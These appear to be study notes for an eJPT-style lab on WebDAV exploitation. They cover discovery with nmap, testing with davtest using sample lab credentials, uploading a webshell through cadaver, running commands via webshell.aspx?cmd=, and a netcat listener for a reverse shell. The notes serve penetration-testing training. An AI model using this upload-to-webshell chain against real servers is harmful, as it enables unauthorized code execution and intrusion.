# 🌐 WebDAV Enumeration & Exploitation — FULL DETAILED NOTES (EN)

---

## 1. What is WebDAV?

**WebDAV (Web Distributed Authoring and Versioning)** is an **HTTP extension** that allows remote users to:

- Upload files
    
- Create directories
    
- Modify files
    
- Delete files
    

WebDAV uses standard HTTP methods and is often enabled on:

- Microsoft IIS
    
- Apache
    
- Nginx (with modules)
    

📌 If WebDAV is **misconfigured**, it can lead to **Remote Code Execution (RCE)**.

---

## 2. WebDAV HTTP Methods (Critical)

| Method   | Purpose                  |
| -------- | ------------------------ |
| PUT      | Upload files             |
| GET      | Retrieve files           |
| DELETE   | Remove files             |
| MKCOL    | Create directories       |
| PROPFIND | List resources           |
| OPTIONS  | Discover allowed methods |

📌 PUT + executable file = **webshell**

---

## 3. Where WebDAV Runs

- **Ports:** 80 / 443
    
- **Common path:** `/webdav`
    
- Often protected by **Basic Auth**
    

---

## 4. Security Impact of WebDAV

If WebDAV allows:

- Directory creation
    
- File upload
    
- Executable extensions
    

➡️ Attacker can upload:

- `.asp`
    
- `.aspx`
    
- `.php`
    
- `.jsp`
    

➡️ Result: **Remote Code Execution**

---

## 5. WebDAV Discovery with Nmap

```bash
nmap --script http-enum -sV -p 80 <target>
```

Purpose:

- Discover `/webdav`
    
- Enumerate HTTP paths
    

---

## 6. Testing WebDAV with davtest (Lab Core Tool)

### Authenticated WebDAV Test

```bash
davtest -auth usr:password -url http://demo.ine.local/webdav
```

### What davtest checks:

- WebDAV availability
    
- Directory creation (MKCOL)
    
- File upload (PUT)
    
- Executable extensions
    
- File execution
    

---

### Example Output Meaning

- `MKCOL SUCCEED` → directory creation allowed
    
- `PUT SUCCEED` → file upload allowed
    
- `EXEC SUCCEED` → executable behavior confirmed
    

📌 If `.aspx` uploads successfully → IIS RCE possible

---

## 7. Webshell Concept

A **webshell** is a server-side script that allows command execution via HTTP.

Example:

```
webshell.aspx?cmd=whoami
```

If executed:  
➡️ Server runs OS command  
➡️ Output returned in HTTP response

---

## 8. Manual WebDAV Interaction with cadaver

### Connect to WebDAV

```bash
cadaver http://demo.ine.local/webdav
```

### Common cadaver commands

```bash
ls
put shell.aspx
get file.txt
delete file.txt
```

📌 cadaver works like FTP but over WebDAV

---

## 9. Lab Exploitation Flow (Real eJPT Style)

### Step 1: Discover WebDAV

```bash
nmap --script http-enum -p 80 demo.ine.local
```

---

### Step 2: Test Upload Capability

```bash
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```

---

### Step 3: Upload Webshell

```bash
put webshell.aspx
```

---

### Step 4: Execute Command

```
http://demo.ine.local/webdav/webshell.aspx?cmd=dir+C%3A%5C
```

---

### Step 5: Gain Remote Code Execution

- Run system commands
    
- Drop reverse shell
    
- Pivot internally
    

---

## 10. Listener Setup (Reverse Shell Example)

```bash
nc -nvlp 2222
```

Waits for inbound connection from target.

---

## 11. Common WebDAV Attack Chains

WebDAV → File Upload  
→ Webshell  
→ RCE  
→ Privilege Escalation  
→ Lateral Movement

---

